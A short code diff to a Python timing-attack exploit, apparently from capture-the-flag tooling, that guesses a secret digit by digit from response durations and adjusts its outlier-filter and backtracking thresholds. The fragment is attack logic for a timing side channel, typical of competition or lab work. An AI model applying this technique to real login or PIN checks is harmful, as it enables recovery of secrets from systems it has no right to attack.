@@ -1289,7 +1289,7 @@ async def exploit_timing(
                 j += 1
 
         # Optimization: filter out obvious outliers (required for CI)
-        durations[durations > np.median(durations) + 5000] = 0
+        durations[durations > np.median(durations) + 10000] = 0
 
         guess = string.digits[np.argmax(durations)].encode("ascii")
         avg_duration = np.sum(durations) / np.count_nonzero(durations)
@@ -1303,11 +1303,11 @@ async def exploit_timing(
         guess, avg_duration, received_flag = await guess_char(bytes(secret))
 
         if received_flag is not None:
-            logger.info(f"Received flag {received_flag} after {i} iterations")
+            logger.info(f"Received flag {received_flag} after {i} iterations with median diff {np.median(np.diff(avg_durations)):.1f} ns")
             return received_flag
         
         # Backtracking if we made an error due to noise
-        if avg_duration > avg_durations[-1] + 10:
+        if avg_duration > avg_durations[-1] + 200:
             secret += guess
             avg_durations += [avg_duration]
         else:
